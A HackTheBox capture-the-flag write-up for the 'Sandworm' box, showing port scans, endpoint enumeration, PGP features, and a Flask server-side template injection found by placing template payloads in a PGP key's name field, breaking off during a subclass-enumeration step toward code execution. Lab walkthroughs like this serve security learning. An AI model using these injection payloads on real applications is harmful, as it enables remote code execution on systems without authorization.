---
layout: post
title: Exploring Sandworm - SSTI, Sandbox Bypass, and Firejail Root Exploit for Privilege Escalation
date: 04/11/2023
author: Nehal Zaman
tags: ["pgp", "ssti", "sandbox bypass", "rust", "cve-2021-31214", "firejail"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/sandworm/banner.png)

# INTRODUCTION

Welcome everyone! Today, we'll dive into hacking [Sandworm](https://app.hackthebox.com/machines/Sandworm), a medium-difficulty Linux box crafted by [C4rm3l0](https://app.hackthebox.com/users/458049) on [HackTheBox](https://app.hackthebox.com/machines/Sandworm).

Our first step to infiltrate this box is by exploiting a **Server-Side Template Injection** (`SSTI`) vulnerability  in a message secured with `PGP` encryption. This `SSTI` will allow us to gain control over the server.

Next, we'll break out of a sandbox environment on the Linux system by discovering a secret credential and taking control of a `Rust` programming library.

Finally, we'll make our way to the top and obtain superuser privileges by exploiting a weakness in `Firejail`, a security sandboxing tool.

With that introduction, let's get started on our journey.

# SCANNING

```shell
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.11.218 -r 1-65535 -u 5000                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.218:22
Open 10.10.11.218:80
Open 10.10.11.218:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 07:51 EDT
Initiating Ping Scan at 07:51
Scanning 10.10.11.218 [2 ports]
Completed Ping Scan at 07:51, 0.19s elapsed (1 total hosts)
Initiating Connect Scan at 07:51
Scanning ssa.htb (10.10.11.218) [3 ports]
Discovered open port 22/tcp on 10.10.11.218
Discovered open port 80/tcp on 10.10.11.218
Discovered open port 443/tcp on 10.10.11.218
Completed Connect Scan at 07:51, 0.16s elapsed (3 total ports)
Nmap scan report for ssa.htb (10.10.11.218)
Host is up, received syn-ack (0.18s latency).
Scanned at 2023-11-04 07:51:17 EDT for 1s

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

`RustScan` found that three ports were open: **22** (for `SSH`), **80** (for `HTTP`), and **443** (for `HTTPS`).

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p22,80,443 10.10.11.218
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 07:53 EDT
Nmap scan report for 10.10.11.218
Host is up (0.16s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.59 seconds
```

Then, we used the `nmap` to gather more information about these open ports. Here's what we found:

- **Port 22**: This is the `SSH` (Secure Shell) service, and it's running **OpenSSH 8.9p1** on Ubuntu Linux.

- **Port 80**: This is an `HTTP` service running **Nginx 1.18.0** on Ubuntu. The `HTTP` title suggests there might be a redirect to `HTTPS`.

- **Port 443**: This is an `SSL/HTTPS` service also running **Nginx 1.18.0** on Ubuntu. The `SSL` certificate information is provided, indicating it's related to `SSA`, possibly standing for **Secret Spy Agency**.

In addition to the port information, we discovered a domain name, `ssa.htb`, which we added to our `/etc/passwd` file.

# EXPLORING WEBSITE

![](/assets/images/writeups/sandworm/1.png)

The website homepage appeared static with no user interaction.

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u https://ssa.htb -w ~/Documents/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/kali/reports/https_ssa.htb/_23-11-04_08-04-00.txt

Target: https://ssa.htb/

[08:04:00] Starting: 
[08:04:03] 200 -    3KB - /contact
[08:04:04] 200 -    5KB - /about                                            
[08:04:04] 200 -    4KB - /login                                            
[08:04:05] 302 -  225B  - /view  ->  /login?next=%2Fview                    
[08:04:06] 302 -  227B  - /admin  ->  /login?next=%2Fadmin                  
[08:04:07] 200 -    9KB - /guide                                            
[08:04:12] 200 -    3KB - /pgp                                              
[08:04:13] 302 -  229B  - /logout  ->  /login?next=%2Flogout                
[08:04:18] 405 -  153B  - /process                                          
                                                                              
Task Completed
```

`dirsearch` was employed to discover endpoints on the website.

Several endpoints were found through `dirsearch`.

![](/assets/images/writeups/sandworm/2.png)

The `/contact` endpoint featured a text area for users to provide a `PGP` encrypted text signed with their public key, with validation on the backend.

![](/assets/images/writeups/sandworm/3.png)

The `/about` endpoint was also static with no user interaction.

![](/assets/images/writeups/sandworm/4.png)

The `/login` endpoint allowed for logging in, while the `/admin` endpoint redirected to `/login?next=%2fadmin`.

![](/assets/images/writeups/sandworm/5.png)

The `/pgp` endpoint contained the public PGP key.

The `/logout` endpoint redirected to `/login?next=%2flogout`.

The `/process` endpoint returned a `405` status code, suggesting it may accept `POST` requests instead of `GET`.

![](/assets/images/writeups/sandworm/6.png)

The `/guide` endpoint provided some features, including:

- Encryption of a message using the available public key, with the backend decrypting it.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ wget --no-check-certificate 'https://ssa.htb/pgp' -O ssa.pub
--2023-11-04 09:30:08--  https://ssa.htb/pgp
Resolving ssa.htb (ssa.htb)... 10.10.11.218
Connecting to ssa.htb (ssa.htb)|10.10.11.218|:443... connected.
WARNING: The certificate of ‘ssa.htb’ is not trusted.
WARNING: The certificate of ‘ssa.htb’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘ssa.htb’
HTTP request sent, awaiting response... 200 OK
Length: 3187 (3.1K) [text/html]
Saving to: ‘ssa.pub’

ssa.pub                                         100%[====================================================================================================>]   3.11K  --.-KB/s    in 0s      

2023-11-04 09:30:08 (63.9 MB/s) - ‘ssa.pub’ saved [3187/3187]
```

- Downloading the server's public key.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --import ssa.pub                                            
gpg: key C61D429110B625D4: public key "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" imported
gpg: Total number processed: 1
gpg:               imported: 1
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --list-keys     
/home/kali/.gnupg/pubring.kbx
-----------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]
```

- Adding the server's public key to the local keyring.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt 

CURIOSITY LOVES HACKING THINGS!

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --encrypt --armor --recipient atlas@ssa.htb example.txt 
gpg: 6BB733D928D14CE6: There is no assurance this key belongs to the named user

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Subkey fingerprint: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc 
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmARAAsQx9EL9kwuRNTsnbKVyGLBajrpG8EMPBEVdijd2pIVyI
fLqafB29BA6ippXnWTSK0eKXwPVC3bZJ/kLtaMREg2B3WUGIiAPdEcWHRSyWD0rb
ti8KsA7dycdPFSu6ct/dIPrDnYVO6PS5F2i6PAis+nZKRfaEKU60FJW3AiC/gDRi
71Nnwcbd7Vkc90tQgxTWJ6lGCSuZJCQUm8Sm52BEUzXgWVnVaHymtQPL6mHtdk/Z
dcgJsCe4ArdDeTdx9Z0OEfdCw1X7G+71H/H3d69mFgtY0pTg2RmCTD6GBHzXxCRw
fgdYcGaoa1cIBgSdW2VEufq11Q6PZ8AvJRInyu0oHjKF7m3d0unoMRnfHsUw8Nlv
bFlM3rb1xiVebasTfE1kKcrbEoDkg7xCRZ7AcN8eu7rrq25chQLuuoj1mWfv5HzA
v6kX2byIlkL8QwhhWB4znvlQNGCuUqfrwMOhjfPMygz8WV/UedLjjHnSjpl5usPF
5tz+KhG6NlU8TY4B1q69WUN1+fI+IiUTYeesVA7+Qaob0KWknKnHWTLKNWDIOy4a
PygidhDZGuRRo/FWXsVmLRRHkqKfq6wr1X17L0omQdkv323NH55CsTo7FcKUQs+Q
nHbIkxuOgDVcFiwiNDhg6DsP3Lor1VlJd5QsB61tVeouB4F1Hbl+w3sES4jWQW3S
ZwFzO5VXvSMb0sTuikKOAY1jzwhRnHT4DlTVbdU9NoX2M+90Dw1GoqNwv3vL52EB
JXhkpEKkpfBns2HI2BB4hbW0CB1l9dX2EurDIwZGxaMdQJlLMQeWcVBXHSqV4tV2
lsX6gQnQfow=
=ndj/
-----END PGP MESSAGE-----
```

- Creating an encrypted message.

![](/assets/images/writeups/sandworm/7.png)

- Decrypting the message on the server.

Another feature allowed users to provide their public key, and the backend would create a `PGP` encrypted message that the user could decrypt locally.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --gen-key                                              
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: curiosity
Email address: curiosity@hacksfor.fun
You selected this USER-ID:
    "curiosity <curiosity@hacksfor.fun>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/D49AE32B51AD02A17B43E6287993E28B4099C3FF.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-04 [SC] [expires: 2025-11-03]
      D49AE32B51AD02A17B43E6287993E28B4099C3FF
uid                      curiosity <curiosity@hacksfor.fun>
sub   rsa3072 2023-11-04 [E] [expires: 2025-11-03]

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --list-keys
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: next trustdb check due at 2025-11-03
/home/kali/.gnupg/pubring.kbx
-----------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

pub   rsa3072 2023-11-04 [SC] [expires: 2025-11-03]
      D49AE32B51AD02A17B43E6287993E28B4099C3FF
uid           [ultimate] curiosity <curiosity@hacksfor.fun>
sub   rsa3072 2023-11-04 [E] [expires: 2025-11-03]
```

- We generated a key pair for this feature.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --export --armor curiosity@hacksfor.fun > curiosity.pub
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat curiosity.pub  
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
AS7dd6bMHO+UzjVcUznqqV6XBQKpfJHd5Fo=
=16+G
-----END PGP PUBLIC KEY BLOCK-----
```

- We also exported the public key.

![](/assets/images/writeups/sandworm/8.png)

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat server.txt   
-----BEGIN PGP MESSAGE-----

hQGMA9dzlx86fpobAQv+NS2JLlHw+XJYQGII/32zc1ASk45UJSy7c7oIhRJASFga
BA510C5Nr2ev8CHuHOfSNbEFtL8efkAyKo42J4av1IXx8pXrHyRWo8AOf2foIxVu
RkW1zNuRAm4QSdgPYXo+ZRxhtraF+jH1ngQTLU5lPVz3qRDRLzsA1JgWd7cdSqRJ
0NVpEETimJBeQWhKIfthiJ9wl0ZHzHpJ/7SFrdWcfjz/Z9ddDklivbrcBoV+h2B0
pPlFvNc3dQ/PCsxXwNwXDc8p+ywr7E8smpySLGc/7H8CmyoLoMzyWWWQPE0KwDBN
vMocqIXH2qQY+bChHKDHpnpLPih2uFBDedVRNKW/zioVnHdI5Hv6qnB1k2kD3eyO
J8TiMOkNYukUpuIiSYxluCMT05X4i0THMkRz9uXQXD7wO0qq6SBqINzagSNx8E/3
TGPbA/gMnTpv649W4G9tJjYSOj8B0t0V3ZZb6GZvND3nFqk7CAXJ4sbFil1MwBlP
WBCX1qoFoDTOk5/IiBfO0sB3Aep8//vr0jA4yhoN0oy589Q3caBZzF5o7wzNgkCv
DvF8H+qbK4ZQQnwWtW/gV/6K9mzT7OUKWBd3lG5LvBEhwhbP7MAEy0waRULxhTB7
JomxPc+c9PlMW01RXmyvVUY/zTDTlMOGYLXaBQgMwbX1u+gvf2uiydDOXMNstMMW
fBugAzwwMK5BdbRmUs0vB7qSM3HWrZ4WTu9VFS+003YwFTAZRw4JyyTiuNNV+gMh
/gnJUaHRRwSAkxPFmv9dbmhJJ3p1aTpwCKZmw3HAGKOS0PrS7u+txhuaOkz6vuhM
SnswaAONyYTZi6ywQGq58jrzOXVgqzoNCuvJ4qdYVEjtxdtrB48/wtaRtM2o2hhf
980ocMUDKWz909NoWiq6/xgU+u8XiFrzQmLwhtfN2IgnlwCyLmjRjx0=
=vrKd
-----END PGP MESSAGE-----

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --decrypt server.txt                                   
gpg: encrypted with 3072-bit RSA key, ID D773971F3A7E9A1B, created 2023-11-04
      "curiosity <curiosity@hacksfor.fun>"
This is an encrypted message for curiosity <curiosity@hacksfor.fun>.

If you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.

Congratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.

SSA: 11/04/2023-13;40;30
```

The server provided an encrypted text that we decrypted successfully.

There was a final feature where users needed to provide their public key and a signed encrypted message, and the server would validate it.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --clear-sign --default-key curiosity@hacksfor.fun example.txt 
gpg: using "curiosity@hacksfor.fun" as default secret key for signing
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc 
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


CURIOSITY LOVES HACKING THINGS!

-----BEGIN PGP SIGNATURE-----

iQHLBAEBCgA1FiEE1JrjK1GtAqF7Q+YoeZPii0CZw/8FAmVGSosXHGN1cmlvc2l0
eUBoYWNrc2Zvci5mdW4ACgkQeZPii0CZw/+bVwv/Wu74TvQ7Vtb+81Zh4A16Ke/j
QBVXEFmCBnCQuLKjAwvHWCSNpHKUSccmugfObPx04Edtuzm753RUASlPFe0VHHiN
nK178n2UB+qOTRTH5NjiA0cfA62nQUizSCBW50pAjsyD0+B/EkL2yCxOCT3htep+
zEduYzeI0pAXFB13tCm/uPs2+mIWniwSntn7B59/NayQbxOPgutmpzAhozDvQJOq
nLeoBGk2t0hZQBEZWnH2rOjZu8ynsyk40O2lN498waO44GFSRUijx9D6iZsrNPqD
3lhwx8HMRbxf/FddetGTl2R3ykzECZERzZqi+kJwjq0yK8jbJV3n/9nI9W39e33y
8AyLS635QsS39e0HILtuRnr65WbHKzsveDXSthUHz7XaatMs0ZFBaezQuPxyYHU9
LpiaZuhM5tYzQoSWJ2xrNax7WTp1D21fvqVUurD2Xmld+cji/NIgdgadf5i8pVBP
4EaegZQrLk9REsHNyjnjtGc/y+4PqkX32f6g9c/9
=lIjh
-----END PGP SIGNATURE-----
```

![](/assets/images/writeups/sandworm/9.png)

We created a signed encrypted text for a previously created file and received a valid signature confirmation from the server.

# DISCOVERING SSTI

In the previous section when we visited the `/guide` endpoint of the website, we noticed that the actual username used for `PGP` signing was displayed in the response popup.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --clear-sign --default-key curiosity@hacksfor.fun example.txt 
gpg: using "curiosity@hacksfor.fun" as default secret key for signing
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc 
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


CURIOSITY LOVES HACKING THINGS!

-----BEGIN PGP SIGNATURE-----

iQHLBAEBCgA1FiEE1JrjK1GtAqF7Q+YoeZPii0CZw/8FAmVGSosXHGN1cmlvc2l0
eUBoYWNrc2Zvci5mdW4ACgkQeZPii0CZw/+bVwv/Wu74TvQ7Vtb+81Zh4A16Ke/j
QBVXEFmCBnCQuLKjAwvHWCSNpHKUSccmugfObPx04Edtuzm753RUASlPFe0VHHiN
nK178n2UB+qOTRTH5NjiA0cfA62nQUizSCBW50pAjsyD0+B/EkL2yCxOCT3htep+
zEduYzeI0pAXFB13tCm/uPs2+mIWniwSntn7B59/NayQbxOPgutmpzAhozDvQJOq
nLeoBGk2t0hZQBEZWnH2rOjZu8ynsyk40O2lN498waO44GFSRUijx9D6iZsrNPqD
3lhwx8HMRbxf/FddetGTl2R3ykzECZERzZqi+kJwjq0yK8jbJV3n/9nI9W39e33y
8AyLS635QsS39e0HILtuRnr65WbHKzsveDXSthUHz7XaatMs0ZFBaezQuPxyYHU9
LpiaZuhM5tYzQoSWJ2xrNax7WTp1D21fvqVUurD2Xmld+cji/NIgdgadf5i8pVBP
4EaegZQrLk9REsHNyjnjtGc/y+4PqkX32f6g9c/9
=lIjh
-----END PGP SIGNATURE-----
```

![](/assets/images/writeups/sandworm/9.png)

Additionally, we observed in the website's footer that it is powered by the `Flask` framework. Given this information, the most likely vulnerability to investigate is **Server-Side Template Injection** (`SSTI`).

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --gen-key                                    
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: { { 7*8 } }
Email address: curiosity@hacksfor.fun
You selected this USER-ID:
    "{ { 7*8 } } <curiosity@hacksfor.fun>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/08BC91C6ABC9586271D3163AF3EFBBE27020C3B7.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-04 [SC] [expires: 2025-11-03]
      08BC91C6ABC9586271D3163AF3EFBBE27020C3B7
uid                      { { 7*8 } } <curiosity@hacksfor.fun>
sub   rsa3072 2023-11-04 [E] [expires: 2025-11-03]

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --clear-sign --default-key curiosity@hacksfor.fun example.txt
gpg: using "curiosity@hacksfor.fun" as default secret key for signing
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc 
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


CURIOSITY LOVES HACKING THINGS!

-----BEGIN PGP SIGNATURE-----

iQHLBAEBCgA1FiEECLyRxqvJWGJx0xY68++74nAgw7cFAmVGT6sXHGN1cmlvc2l0
eUBoYWNrc2Zvci5mdW4ACgkQ8++74nAgw7fP6Av5AVhA8FlVb7/Qsovg+WN+gkDS
YCIz+UE+o8Z7CoUV5g2irTSZgPU65WscPbQ1Insi081pFkeqvefp/If0PDnUYj9a
O/vC0Q2/Q8MJYqRNUbEsXNiX2qSRyfEquvRzCeZZF7y82OeClR6K2LbcGuNYJAer
OpObOl+aLurOiJzNqDqg7IsaVpyefiSAcKq9Xcf5s/r34Hx0qAUWqK8nxOci4lXk
DJfTl0iLPzM3fkz/U+JX1tsqc8MTM/XKsAufRl2RiUAK6F5+nqU+oavTgHqI63PQ
Zd1d6CpU/t6jij3b7Cb5rgYod0YvD0DUvDONGZXficup31fHrbNLO37QbkOx0gIk
5gP2phJTLsY5PcpWRPCMerXQ0/C1VLCDotg3qE1YDF2hTn4kZ22c4aNrIClI49vO
3LsmUYEJKrCIG/XKf19AblypiTLMHoQJXbom8aAqK7YcuG4EVmAbY0mW01B6QXhm
fCg2tEpaFjTNv/FwQSvVjJ/JkXdy2NbUlkv7VtJV
=L/qk
-----END PGP SIGNATURE-----
```

To explore this further, we created a new pair of encryption keys and intentionally inserted a simple payload (`{ { 7*8 } }`) into the "Real name" parameter during the key generation process. We then proceeded to create a signed and encrypted message using this manipulated key.

![](/assets/images/writeups/sandworm/10.png)

When we examined the server response, we observed that the number `56` was highlighted, which corresponds to the result of the mathematical expression `7 * 8`. This confirmed the presence of an `SSTI` vulnerability on the website.

# ESCALATING SSTI TO RCE

To escalate **Server-Side Template Injection** (`SSTI`) to **Remote Code Execution** (`RCE`), we needed to take a few steps:

- **Identify Available Functions**: First, we identified available functions and methods in the application. This allowed us to find the `Popen` function, which is commonly used to run Linux commands. We noted that the index of the `Popen` function was `439` in the list of functions.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --gen-key                                                    
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: { {''.__class__.__base__.__subclasses__()} }
Email address: curiosity@hacksfor.fun
You selected this USER-ID:
    "{ {''.__class__.__base__.__subclasses__()} } <curiosity@hacksfor.fun>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/320C70A646FEEFBF1EDAD558FE9A40DDFFE4C249.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-04 [SC] [expires: 2025-11-03]
      320C70A646FEEFBF1EDAD558FE9A40DDFFE4C249
uid                      { {''.__class__.__base__.__subclasses__()} } <curiosity@hacksfor.fun>
sub   rsa3072 2023-11-04 [E] [expires: 2025-11-03]
```

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --export --armor curiosity@hacksfor.fun > curiosity.pub
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --clear-sign --default-key curiosity@hacksfor.fun example.txt
gpg: using "curiosity@hacksfor.fun" as default secret key for signing
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat curiosity.pub
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVGU0EBDADU4rSHk7tQgwmcZWerg3ETSnXhU4Ms1wqANny84KL4BuCpTxup
